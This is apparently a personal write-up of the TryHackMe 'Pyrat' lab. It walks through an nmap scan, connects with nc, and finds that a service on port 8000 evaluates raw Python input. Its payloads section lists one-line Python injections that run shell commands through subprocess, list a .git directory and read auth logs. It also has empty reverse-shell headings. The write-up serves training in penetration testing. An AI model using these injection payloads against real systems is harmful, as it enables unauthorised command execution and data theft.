# Room: Pyrat (TryHackMe)

## Methodology

_Host:_ `<host>`

1. NMAP Scan
    1. `sudo nmap -vv -sV -sC -O -T5 -oN init.nmap <host>`
    2. Identify:
        - Port: 22 (SSH)
        - Port: 8000 (Python Simple HTTP Server) Version 0.6 Python 3.11
    ```markdown
    PORT     STATE SERVICE  REASON         VERSION
    22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 0a:5b:f1:f3:1a:50:ab:bd:1f:1e:71:8b:cd:9a:0d:10 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0m3/zWB4/AVcVlsS+BQzhKi9jwPRJFtY5t4EXItwdw2Dp0lyAn/K6lwuyP1LpIjTABxlhMbQCZ2hNkUyoA3d8GdGaNqLnuy8kDKxXT2TERpPqtNQaDruG+jvbd1bE628o47VUjHkE4V++12cPXer1er/t8gFDMOY9cyJGmiqFaKdAMJvjTDkx8t0Jq3NMkKSe4yIHQ/uJrkyEaGW5ZeFX0k7WKZWHp8hTglfhlNuj+hvWdLkqUO073RkkcyxUjWhd8O9l+2/tIoELDWc4VhCuJdkD2rTGXTaD0PLsiDl2KKljXLSP4pvN4R/m+UZaClHvtFb+a9/WIzPc4jcuBaf11JEoJs2am4nQcoLbcibkd9sHIq/1nwJKRFe8JbhphECu6P0GcyOhdOFDW1CZjPo7eSIwsUxcgTfAg3uxmqEcX8BauKvltFse9x2UwDy44uxYpCT1w0UYpeyLYeIU8vG5KGvUv1Tn6jts48bumHQC6xxRvw5HRRAwr8lmjoLk6Uk=
    |   256 45:13:bf:d2:c0:c9:c9:fb:bc:96:78:37:24:7d:63:d7 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG57YgqLmGaHqqDrwnRYbkXKaZenfRykhNlEHC/U6BoYuEvVWYsbS8TvhgJoKaQQfVhL4roSHhf+0UWYg8GBvII=
    |   256 bb:03:25:fe:e2:8b:22:04:1c:ca:ad:6f:ef:21:d2:10 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIb+oxRhFjLL8x/Do1wfgDt+73S8UQAQkp/x5mxkBfPm
    8000/tcp open  http-alt syn-ack ttl 62 SimpleHTTP/0.6 Python/3.11.2
    |_http-server-header: SimpleHTTP/0.6 Python/3.11.2
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
    |     source code string cannot contain null bytes
    |   FourOhFourRequest, LPDString, SIPOptions: 
    |     invalid syntax (<string>, line 1)
    |   GetRequest: 
    |     name 'GET' is not defined
    |   HTTPOptions, RTSPRequest: 
    |     name 'OPTIONS' is not defined
    |   Help: 
    |_    name 'HELP' is not defined
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
    ```
2. fuzz the domain.
    - Results in nothing, has text on the landing page: `Try a more basic connection`
3. nc to the domain `nc 10.67.158.45 8000`
4. pass a command `test` and `name 'ls' is not defined`.
    - This indeicated a `NameError` inside of the python interpreter.
    - Identified `os` existance allowing for `os.system`.
    

### Payloads

> _Note:_ While I am aware that a Reverse/Bind/PHP/HTA shell(s) would be optimal, for my own personal growth, I am going to keep my initial payloads under direct-execution manually. For the most part, or untilI feel satisifed with my manual operations.

__Initial Subprocess Popen Exec__`a=__import__('subprocess');out=a.Popen([''],shell=True,stdout=a.PIPE,stderr=a.STDOUT).communicate()[0].decode();print(out)`

__Simple Directory Enum__ `b=__import__('os');print(b.listdir('/opt/dev/.git'))`
    

__Multiple File Reading__

```python
[ 
    print(i) for i in open('/var/log/auth.log.1','r').read().split('\n'),
    ... 
]
```

__Reverse Shell (Bash)__

> _Note:_ Bash shells tend to not call back properly.

__Reverse Shell (PHP)__

> _Note:_ Not confirmed that `php` is installed.



